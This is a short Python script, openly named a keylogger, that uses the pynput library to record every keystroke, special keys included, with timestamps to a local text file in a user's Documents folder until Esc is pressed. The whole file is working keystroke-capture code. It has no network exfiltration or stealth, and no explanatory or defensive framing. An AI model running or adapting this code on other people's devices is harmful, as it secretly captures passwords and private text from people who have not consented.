import pynput
from pynput.keyboard import Key, Listener
import logging
import os

# Specify the directory and file name for the log file
log_dir = r"C:\Users\harsh\OneDrive\Documents\Python\Keylogger"
log_file = os.path.join(log_dir, "keylog.txt")

# Configure logging settings
if not logging.getLogger().hasHandlers():
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        # This handles special keys like space, enter, etc.
        logging.info(f'{key}')

def on_release(key):
    # Stop listener on 'Esc' key press
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
